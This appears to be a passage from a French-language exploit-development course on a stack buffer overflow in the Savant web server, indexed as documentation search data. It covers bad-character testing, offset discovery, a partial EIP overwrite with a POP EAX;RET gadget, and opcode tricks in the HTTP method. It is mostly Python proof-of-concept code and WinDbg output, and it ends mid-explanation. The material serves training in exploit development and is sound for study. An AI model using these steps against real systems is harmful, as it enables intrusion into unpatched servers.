b\"\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n    b\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\"\n    b\"\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\"\n    b\"\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\"\n    b\"\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\"\n    b\"\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\"\n    b\"\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\"\n    b\"\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\"\n    b\"\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\"\n    b\"\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\"\n    b\"\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\"\n    b\"\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\"\n    b\"\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\"\n    b\"\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\"\n    b\"\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\"\n    b\"\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")\n\n  httpMethod = b\"GET /\"\n  inputBuffer = badchars\n  inputBuffer += b\"\\x41\" * (size - len(inputBuffer))\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n</code></pre> <p>Si on lance tel quel le programme ne crash pas, indiquant la pr\u00e9sence d'un mauvais caract\u00e8re. On commente la premi\u00e8re moiti\u00e9 des caract\u00e8res pour identifier o\u00f9 se trouve le caract\u00e8re probl\u00e9matique.</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 260\n\n  badchars = (\n#    b\"\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\"\n#    b\"\\x0d\\x0e\\x0f\\x10\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\"\n#    b\"\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\"\n#    b\"\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\\x31\\x32\\x33\"\n#    b\"\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\"\n#    b\"\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\"\n#    b\"\\x4e\\x4f\\x50\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\"\n#    b\"\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\\x61\\x62\\x63\\x64\\x65\\x66\\x67\"\n#    b\"\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\\x71\\x72\\x73\\x74\"\n#    b\"\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\"\n    b\"\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\"             # 2em moitie\n    b\"\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\"\n    b\"\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\"\n    b\"\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\"\n    b\"\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\"\n    b\"\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\"\n    b\"\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\"\n    b\"\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\"\n    b\"\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\"\n    b\"\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\")\n\n  httpMethod = b\"GET /\"\n  inputBuffer = badchars\n  inputBuffer += b\"\\x41\" * (size - len(inputBuffer))\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n</code></pre> <p>On relance l'exploit et on a bien un d\u00e9passement. Il n'y a donc aucun mauvais caract\u00e8re dans cette deuxi\u00e8me moiti\u00e9 :</p> <pre><code># Affichage de ESP\n0:004&gt; db esp\n0466ea2c  41 41 41 00 84 ea 66 04-3c 70 41 00 78 57 9e 01  AAA...f.&lt;pA.xW..\n[...]\n0466ea7c  00 00 00 00 02 00 00 00-47 45 54 00 00 00 00 00  ........GET.....\n0466ea8c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n0466ea9c  2f 82 83 84 85 86 87 88-89 8a 8b 8c 8d 8e 8f 90  /...............             # D\u00e9but des caract\u00e8res\n#\n# Affichage des caract\u00e8res complets jusqu'au 1er 'A'\n0:004&gt; db 0466ea9c\n0466ea9c  2f 82 83 84 85 86 87 88-89 8a 8b 8c 8d 8e 8f 90  /...............\n0466eaac  91 92 93 94 95 96 97 98-99 9a 9b 9c 9d 9e 9f a0  ................\n0466eabc  a1 a2 a3 a4 a5 a6 a7 a8-a9 aa ab ac ad ae af b0  ................\n0466eacc  b1 b2 b3 b4 b5 b6 b7 b8-b9 ba bb bc bd be bf c0  ................\n0466eadc  c1 c2 c3 c4 c5 c6 c7 c8-c9 ca cb cc cd ce cf d0  ................\n0466eaec  d1 d2 d3 d4 d5 d6 d7 d8-d9 da db dc dd de df e0  ................\n0466eafc  e1 e2 e3 e4 e5 e6 e7 e8-e9 ea eb ec ed ee ef f0  ................\n0466eb0c  f1 f2 f3 f4 f5 f6 f7 f8-f9 fa fb fc fd fe ff 41  ...............A\n</code></pre> <p>On continue en d\u00e9commandant ligne par ligne. On d\u00e9-commente donc <code>b\"\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\\x81\"</code></p> <pre><code>#\n(144.db8): Access violation - code c0000005 (first chance)\n[...]\neax=ffffffff ebx=01b15778 ecx=3d909e99 edx=00000000 esi=01b15778 edi=0041703c\neip=41414141 esp=0469ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\n41414141 ??              ???\n#\n0:004&gt; db esp\n0469ea2c  41 41 41 00 84 ea 69 04-3c 70 41 00 78 57 b1 01  AAA...i.&lt;pA.xW..\n[...]\n0469ea7c  00 00 00 00 02 00 00 00-47 45 54 00 00 00 00 00  ........GET.....\n0469ea8c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................\n0469ea9c  2f 75 76 77 78 79 7a 7b-7c 7d 7e 7f 80 81 82 83  /uvwxyz{|}~..... # Commence ici\n</code></pre> <p>On a encore tous les caract\u00e8res, on continue ligne par ligne en remontant vers le haut.</p> <p>Quand on arrive a la ligne <code>b\"\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\\x21\\x22\\x23\\x24\\x25\\x26\"</code> l'overflow est diff\u00e9rent. <code>EIP</code> n'est pas r\u00e9\u00e9crit.</p> <pre><code>(10e4.bc8): Access violation - code c0000005 (first chance)\n[...]\neax=045a0041 ebx=001a5778 ecx=00000001 edx=00020b40 esi=001a5778 edi=0041703c\neip=0040c05f esp=045ae6b8 ebp=045aea24 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nSavant+0xc05f:\n0040c05f 8b08            mov     ecx,dword ptr [eax]  ds:0023:045a0041=????????\n</code></pre> <p>Il y a donc un mauvais caract\u00e8re dans cette ligne :</p> <ul> <li>Si on enl\u00e8ve <code>\\x26</code> on a un d\u00e9passement de tampon, mais qui ne r\u00e9\u00e9crit pas <code>EIP</code>, indiquant que le mauvais caract\u00e8re est toujours la</li> <li>Si on \u00e9l\u00e8ve <code>\\x25</code> on a un  d\u00e9passement de tampon qui r\u00e9\u00e9crit le <code>EIP</code></li> <li>C'est donc un mauvais caract\u00e8re</li> </ul> <p>On continue jusqu'\u00e0 remonter \u00e0 la premi\u00e8re ligne. Les mauvais caract\u00e8res identifient sont : <code>0x00</code> - <code>0x0D</code> - <code>0x0A</code> - <code>0x25</code></p>"},{"location":"binary-exploitation/3-egghunters/#determiner-loffset-exact","title":"D\u00e9terminer l'offset exact","text":"<p>Une fois de plus, on veut identifier l'offset exact qui r\u00e9\u00e9crit <code>EIP</code>. On g\u00e9n\u00e8re un pattern unique :</p> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/media/\u2026/os/exp-301-osed/cours/cours6]\n\u2514\u2500$ msf-pattern_create -l 260 \nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai\n</code></pre> <p>On met a jour la preuve d'exploitation :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 260\n\n  httpMethod = b\"GET /\"\n  inputBuffer = b\"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai\"\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n\n  buf = httpMethod + inputBuffer +  httpEndRequest\n</code></pre> <p>L'ex\u00e9cution de la preuve de concept entraine un d\u00e9passement de tampon, mais <code>EIP</code> n'est pas r\u00e9\u00e9crit par un pattern unique :</p> <pre><code>(1210.132c): Access violation - code c0000005 (first chance)\n[...]\neax=00694135 ebx=01935778 ecx=de4eadbe edx=00000001 esi=01935778 edi=0041703c\neip=0040c05f esp=045ee6b8 ebp=045eea24 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\nSavant+0xc05f:\n0040c05f 8b08            mov     ecx,dword ptr [eax]  ds:0023:00694135=????????\n</code></pre> <pre><code>\u250c\u2500\u2500(kali\u327fkali)-[/media/\u2026/os/exp-301-osed/cours/cours6]\n\u2514\u2500$ msf-pattern_offset -l 260 -q 0040c05f \n[*] No exact matches, looking for likely candidates...\n</code></pre> <p>On opte donc pour l'identification manuelle de l'offset \u00e0 travers de la dichotomie.</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 260\n\n  httpMethod = b\"GET /\"\n  inputBuffer = b\"\\x41\" * 130\n  inputBuffer += b\"\\x42\" * 130\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n\n  buf = httpMethod + inputBuffer +  httpEndRequest\n</code></pre> <p>Le registre <code>EIP</code> est \u00e0 <code>42424242</code>. Indiquant que le d\u00e9passement de tampon est donc dans la deuxi\u00e8me moiti\u00e9.</p> <p>On continus dans la dichotomie :</p> <ul> <li>On augmente de la moiti\u00e9 de 130 le nombre de <code>A</code></li> <li>On diminue de moiti\u00e9 le nombre de <code>B</code></li> </ul> <pre><code>  httpMethod = b\"GET /\"\n  inputBuffer = b\"\\x41\" * 195\n  inputBuffer += b\"\\x42\" * 65\n</code></pre> <p>Le d\u00e9passement se situe toujours dans la deuxi\u00e8me partie :</p> <pre><code>(e04.12d8): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\n*** WARNING: Unable to verify checksum for C:\\Savant\\Savant.exe\neax=ffffffff ebx=018c5778 ecx=0bc8af86 edx=00000000 esi=018c5778 edi=0041703c\neip=42424242 esp=045cea2c ebp=42424242 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\n42424242 ??              ???\n</code></pre> <p>On continue de cette mani\u00e8re jusqu'\u00e0 arriver \u00e0 la configuration suivante :</p> <pre><code>  httpMethod = b\"GET /\"\n  inputBuffer = b\"\\x41\" * 253\n  inputBuffer += b\"\\x42\\x42\\x42\\x42\"\n</code></pre> <pre><code>(168c.16c4): Access violation - code c0000005 (first chance)\n[...]\neax=ffffffff ebx=01995778 ecx=58fe6b05 edx=00000000 esi=01995778 edi=0041703c\neip=42424242 esp=0461ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\n42424242 ??              ???\n</code></pre> <p><code>253</code> est donc l'offset exact pour r\u00e9\u00e9crire <code>EIP</code>.</p>"},{"location":"binary-exploitation/3-egghunters/#reecriture-partielle-de-eip","title":"R\u00e9\u00e9criture partielle de EIP","text":"<p>On identifie que le seul module charge contient un null byte au sein de son adresse de d\u00e9but. Les null byte sont des mauvais caract\u00e8res, surtout dans notre cas ou le buffer est traite comme un string. Les null byte entraine la fin du string.</p> <pre><code>0:004&gt; .load narly\n#\n0:004&gt; !nmod\n00400000 00452000 Savant               /SafeSEH OFF                C:\\Savant\\Savant.exe\n</code></pre> <p>Aucun autre module n'est disponible en dehors de l'ex\u00e9cutable principal. Cependant cet ex\u00e9cutable contient des null bytes dans son adresse.</p> <p>Note : Choisir un module Microsoft impliquerait que l'adresse change \u00e0 chaque version de Windows et il faudrait travailler \u00e0 contourner les protections mises en place dans les binaires de Microsoft</p> <p>On se souvient que notre buffer est trait\u00e9 comme un string en m\u00e9moire et qu'il finit donc par <code>00</code> pour terminer le string. On confirme le comportement en relan\u00e7ant l'exploit :</p> <pre><code>0:009&gt; g\n(1638.166c): Access violation - code c0000005 (first chance)\n[...]\neax=ffffffff ebx=01835778 ecx=743857dc edx=00000000 esi=01835778 edi=0041703c\neip=42424242 esp=0456ea2c ebp=41414141 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\n42424242 ??              ???\n#\n0:004&gt; dds @esp L4\n0456ea2c  00434343 Savant+0x34343\n0456ea30  0456ea84\n</code></pre> <p>Le buffer est bien termin\u00e9 par un caract\u00e8re null, permettant d'utiliser la technique r\u00e9\u00e9criture partielle de <code>EIP</code> ou partial EIP overwrite.</p> <p>Comme l'ex\u00e9cutable de <code>Savant.exe</code> est mappe dans une gamme d'adresse qui commence avec un null byte on pourrait utiliser le string null de fin de chaine comme faisant partie de notre r\u00e9\u00e9criture de <code>EIP</code>. Ceci nous permettra de rediriger le flot d'ex\u00e9cution vers n'importe quelle instruction dans le module <code>Savant.exe</code>.</p> <p>Un effet de bord de la r\u00e9\u00e9criture partiel de <code>EIP</code> est que l'on ne peut stocker aucune autre data apr\u00e8s l'adresse de retour, car le null byte va terminer le string.</p> <p>On avait remarqu\u00e9 que le deuxi\u00e8me <code>DWORD</code> sur la pile au moment du crash pointe tr\u00e8s proche du pointeur de pile (<code>ESP</code>). Il pointe toujours sur la m\u00e9thode <code>HTTP</code> et les donn\u00e9es qui suivent :</p> <pre><code>0:004&gt; dds @esp L2\n0470ea2c  00414141 Savant+0x14141\n0470ea30  0470ea84                                                          # DEUXIEME DWORD\n#\n0:004&gt; dc poi(esp+4)\n0470ea84  00544547 00000000 00000000 00000000  GET.............             # METHODE HTTP\n0470ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA\n0470eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n</code></pre> <p>Il faut donc trouver une s\u00e9quence d'instruction qui nous permettrait de rediriger le flot d'ex\u00e9cution vers cette ce deuxi\u00e8me DWORD. On peut utiliser <code>POP R32; RET</code> :</p> <ul> <li><code>POP R32</code> va enlever le premier <code>DWORD</code> de la pile ce qui va entrainer <code>ESP</code> a pointer vers l'adresse m\u00e9moire qui contient notre buffer qui commence avec la m\u00e9thode <code>HTTP GET</code><ul> <li><code>R32</code> fait r\u00e9f\u00e9rence \u00e0 un registre arbitraire de 32b</li> </ul> </li> <li><code>RET</code> devrait \u00eatre plac\u00e9 au d\u00e9but de la m\u00e9thode HTTP</li> </ul> <p>Cela voudrait dire qu'il faudrait ex\u00e9cuter les instructions assembleur g\u00e9n\u00e9r\u00e9es par les opcodes de la m\u00e9thode <code>GET</code>. La m\u00e9thode <code>GET</code> a g\u00e9n\u00e9r\u00e9 les opcodes et les instructions ASM suivants :</p> <pre><code>0:004&gt; u poi(@esp+0x04)\n0460ea84 47              inc     edi\n0460ea85 45              inc     ebp\n0460ea86 54              push    esp\n0460ea87 0000            add     byte ptr [eax],al\n0460ea89 0000            add     byte ptr [eax],al\n0460ea8b 0000            add     byte ptr [eax],al\n0460ea8d 0000            add     byte ptr [eax],al\n0460ea8f 0000            add     byte ptr [eax],al\n</code></pre> <ul> <li> <p>Les instructions suivantes ne sont pas impactantes pour notre flot et n'entrainent pas de violation d'acc\u00e8s</p> <ul> <li><code>inc     edi</code> - <code>inc     ebp</code> et <code>push    esp</code></li> <li>Elles r\u00e9sultent des opcodes <code>544547</code></li> </ul> </li> <li> <p>La derni\u00e8re instruction <code>add     byte ptr [eax],al</code> est une addition qui vise a ajouter la valeur du registre <code>al</code> a la valeur sur laquelle <code>EAX</code> pointe</p> <ul> <li>Peut \u00eatre probl\u00e9matique, car assume que l'adresse sur laquelle <code>EAX</code> pointe est une adresse m\u00e9moire valide</li> <li>G\u00e9n\u00e9r\u00e9 par l'opcode <code>00</code></li> </ul> </li> </ul> <p>Les instructions <code>POP R32;RET</code> vont rediriger le flot d'ex\u00e9cution vers notre buffer. L'instruction <code>POP</code> de la s\u00e9quence nous permettrait de placer le DWORD sur lequel pointe <code>ESP</code> dans le registre de notre choix. Si on peut trouver une instruction tel que <code>POP EAX;RET</code> on va pouvoir garantir que <code>EAX</code> pointe vers une adresse existante et valide.</p> <p>Le premier DWORD dans la pile pointe vers un espace m\u00e9moire faisant partie de la pile et donc un espace m\u00e9moire valide :</p> <pre><code>0:004&gt; dds @esp L5\n0460ea2c  0460fe70\n0460ea30  0460ea84\n#\n0:004&gt; !teb\nTEB at 00244000\n    ExceptionList:        0460ff70\n    StackBase:            04610000\n    StackLimit:           0460c000\n[...]\n</code></pre> <p>G\u00e9n\u00e9ration des opcodes de l'instruction <code>POP EAX;RET</code> :</p> <pre><code>$ msf-nasm_shell\nnasm &gt; pop eax\n00000000  58                pop eax\nnasm &gt; ret\n00000000  C3   \n</code></pre> <p>On cherche ces opcodes dans le module <code>Savant.exe</code></p> <pre><code>0:004&gt; lm m Savant\nBrowse full module list\nstart    end        module name\n00400000 00452000   Savant   C (no symbols)           \n0:004&gt; s -[1]b 00400000 00452000 58 c3\n0x00418674\n[...]\n0:004&gt; u 0x00418674 L4\nSavant+0x18674:\n00418674 58              pop     eax\n00418675 c3              ret\n[...]\n</code></pre> <p>On modifie la preuve de concept pour positionner l'adresse <code>0x00418674</code> dans le registre <code>EIP</code></p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 260\n\n  httpMethod = b\"GET /\"\n  inputBuffer = b\"\\x41\" * 253\n  inputBuffer += pack(\"&lt;L\", (0x418674)) # 0x00418674 : POP EAX ; RET -&gt; EIP\n</code></pre> <p>On ex\u00e9cute la nouvelle preuve de concept :</p> <ul> <li>Le point d'arr\u00eat est atteint</li> <li>Le registre <code>EIP</code> est bien initialise a <code>00418674</code> sur <code>POP EAX</code></li> <li>On avance d'une instruction pour arriver sur <code>RET</code></li> <li>On avance d'une instruction pour arriver sur <code>INC EDI</code> qui est le d\u00e9but des opcodes g\u00e9n\u00e8res par la m\u00e9thode HTTP <code>GET</code></li> </ul> <p>En faisant le <code>POP EAX;RET</code> on a bien r\u00e9ussis a retirer le premier DWORD de <code>ESP</code> et a ex\u00e9cut\u00e9 le deuxi\u00e8me qui pointe sur le shellcode. On retrouve les instructions assembleur d\u00e9coulant des opcodes de la fonction <code>GET</code>. On observe que <code>EAX</code> change de valeur apr\u00e8s le <code>POP EAX</code> :</p> <pre><code>Breakpoint 0 hit\neax=00000000\n[...]\nSavant+0x18674:\n00418674 58              pop     eax\n#\n0:004&gt; t\neax=045bfe70\n[...]\nSavant+0x18675:\n00418675 c3              ret\n#\n0:004&gt; t\n[...]\n045bea84 47              inc     edi\n#\n0:004&gt; u @eip\n045bea84 47              inc     edi\n045bea85 45              inc     ebp\n045bea86 54              push    esp\n045bea87 0000            add     byte ptr [eax],al\n[...]\n0:004&gt; dc @eip\n045bea84  00544547 00000000 00000000 00000000  GET.............\n045bea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA\n045beaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n[...]\n</code></pre> <p>En faisant <code>POP EAX</code> on s'est assur\u00e9 que le premier DWORD de <code>ESP</code> soit dans <code>EAX</code> et comme il pointe sur une adresse de la pile <code>EAX</code> ne contiendra pas d'adresse entrainant une violation d'acc\u00e8s. Les instructions d\u00e9coulant de la commande <code>GET</code> peuvent donc s'ex\u00e9cuter sans effet de bord.</p> <p>Cette m\u00e9thode fonctionnerait, mais ex\u00e9cuter les opcodes d\u00e9coulant de la fonction <code>HTTP</code> n'est pas tr\u00e8s propre. Il existe d'autres options plus \u00e9l\u00e9gantes.</p>"},{"location":"binary-exploitation/3-egghunters/#modification-de-la-methode-http","title":"Modification de la m\u00e9thode HTTP","text":"<p>On souhaite trouver un moyen plus subtil que d'ex\u00e9cuter les opcodes d\u00e9coulant de la fonction HTTP, m\u00eame si ceux-ci sont maintenant fonctionnels. On veut trouver un moyen plus \u00e9l\u00e9gant d'atteindre notre buffer de <code>0x41</code> :</p> <pre><code>0:012&gt; bp 0x00418674\n#\n0:012&gt; g\n00418674 58              pop     eax\n#\n0:005&gt; t\n00418675 c3              ret\n#\n0:005&gt; dc poi(@esp)\n046eea84  00544547 00000000 00000000 00000000  GET.............\n046eea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA\n046eeaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n[...]\n</code></pre> <p>On observe qu'il y a un padding important entre <code>GET</code> et le reste du buffer. On peut supposer que : - Le buffer utilise pour stocker la m\u00e9thode HTTP semble avoir \u00e9t\u00e9 allou\u00e9 avec une taille fixe - La taille de la m\u00e9thode en elle-m\u00eame ne semble pas \u00eatre prise en compte ni v\u00e9rifi\u00e9e     * Si elle n'est pas v\u00e9rifi\u00e9e, on peut essayer de la remplacer avec des opcodes d'instructions ASM qui permettraient d'atteindre nos <code>0x41</code></p> <p>Mise \u00e0 jour de la preuve de concept :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 260\n\n  httpMethod = b\"\\x43\\x43\\x43\\x43\\x43\\x43\\x43\\x43\" + b\" /\"\n  inputBuffer = b\"\\x41\" * 253\n  inputBuffer += pack(\"&lt;L\", (0x418674)) # 0x00418674 : POP EAX ; RET -&gt; EIP\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n</code></pre> <p>Ex\u00e9cution de la preuve de concept et positionnement d'un point d'arr\u00eat sur l'adresse o\u00f9 se trouve la s\u00e9rie d'instructions <code>POP EAX;RET</code> :</p> <pre><code>0:009&gt; bp 0x00418674\n#\n0:009&gt; g\nBreakpoint 0 hit\neax=00000000\n[...]\n00418674 58              pop     eax\n#\n0:004&gt; t\neax=0464fe70\n[...]\n00418675 c3              ret\n#\n0:004&gt; dc poi(@esp)\n0464ea84  43434343 43434343 00000000 00000000  CCCCCCCC........\n0464ea94  00000000 00000000 4141412f 41414141  ......../AAAAAAA\n0464eaa4  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA\n[...]\n</code></pre> <p>On est donc capable de modifier la m\u00e9thode HTTP sans impacter le crash en lui-m\u00eame. La m\u00e9thode est bien remplac\u00e9e par nos <code>0x43</code> qui correspondent a des <code>C</code>.</p> <p>On pourrait utiliser un short jump. Jump de <code>0x17</code> bytes devrait permettre d'arriver dans le buffer. On remplace donc la m\u00e9thode <code>HTTP</code> par les opcodes correspondant \u00e0 un short jump de <code>0x17</code>.</p> <p>Mise \u00e0 jour de la preuve de concept :</p> <pre><code>#!/usr/bin/python\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n  server = sys.argv[1]\n  port = 80\n  size = 253\n\n  httpMethod = b\"\\xeb\\x17\\x90\\x90\" + b\" /\" # Short jump de 0x17\n  inputBuffer = b\"\\x41\" * size\n  inputBuffer += pack(\"&lt;L\", (0x418674)) # 0x00418674 : POP EAX ; RET -&gt; EIP\n  httpEndRequest = b\"\\r\\n\\r\\n\"\n</code></pre> <p>Ex\u00e9cution de la preuve de concept et positionnement d'un point d'arr\u00eat sur l'adresse o\u00f9 se trouve la s\u00e9rie d'instructions <code>POP EAX;RET</code> :</p> <pre><code>0:009&gt; bp 0x00418674\n#\n0:009&gt; g\nBreakpoint 0 hit\n00418674 58              pop     eax\n#\n0:004&gt; t\neax=00000000\n00418674 58              pop     eax\n#\n0:004&gt; t\neax=0467fe70\n00418675 c3              ret\n#\n0:004&gt; t\neax=0467fe70\n0467ea84 cb              retf\n#\n0:004&gt; db @eip L2\n0467ea84  cb 17\n#\n0:004&gt; u @eip\n0467ea84 cb              retf                                           # ERREUR \u00c0 CET ENDROIT\n0467ea85 17              pop     ss\n0467ea86 90              nop\n0467ea87 90              nop\n0467ea88 0000            add     byte ptr [eax],al\n[...]\n</code></pre> <p>La m\u00e9moire ne semble pas contenir les bons caract\u00e8res. Passage de <code>eb17</code> \u00e0 <code>cb17</code>. Pourtant ce caract\u00e8re n'apparaissait pas dans les mauvais caract\u00e8res test\u00e9s pr\u00e9c\u00e9demment.</p> <p>Cet espace m\u00e9moire est potentiellement allou\u00e9 s\u00e9par\u00e9ment de l'allocation du reste du buffer. Il est possible que des op\u00e9rations diff\u00e9rentes soient faites et entrainent cet effet de bord.</p> <p>Ceci est un bon exemple d\u00e9montrant que diff\u00e9rentes allocations m\u00e9moires peuvent avoir de mauvais caract\u00e8res diff\u00e9rents. Il faut trouver une alternative au short jump avec le m\u00eame r\u00e9sultat.</p>"},{"location":"binary-exploitation/3-egghunters/#sauts-conditionnels","title":"Sauts conditionnels","text":"<p>Les sauts conditionnels ou conditional jumps sont une alternative au short jump. Ils ex\u00e9cutent un saut en fonction de conditions. Ils fonctionnent en deux \u00e9tapes :</p> <ul> <li>Test de la condition</li> <li>Saut si la condition est vraie ou continue l'ex\u00e9cution si la condition est fausse</li> </ul> <p>Il en existe en grand nombre, chacun d\u00e9pendant de registre <code>FLAG</code> sp\u00e9cifique.</p> <p>On choisit d'utiliser l'instruction <code>JE</code>. La condition de ce saut est bas\u00e9e sur la valeur du registre <code>ZF</code> (Zero Flag). Le saut se fait uniquement si la valeur de <code>ZF</code> est \u00e0 <code>1</code> (<code>TRUE</code>).</p> <p>The Zero Flag register is a single bit flag that is used on most architectures. On x86/x64, it is stored in a dedicated register called ZF. This flag is used to check the result of arithmetic operations. It is set to 1 (TRUE) if the result of an arithmetic operation is zero and otherwise set to 0 (FALSE).</p> <p>Il faut donc garantir que <code>ZF</code> soit a <code>1</code> pour assurer la r\u00e9alisation du saut. Peut \u00eatre fait en 2 \u00e9tapes :</p> <ul> <li>Appliquer une op\u00e9ration <code>XOR</code> sur <code>ECX</code> en tant que destination et source (premiere et deuxieme operande)<ul> 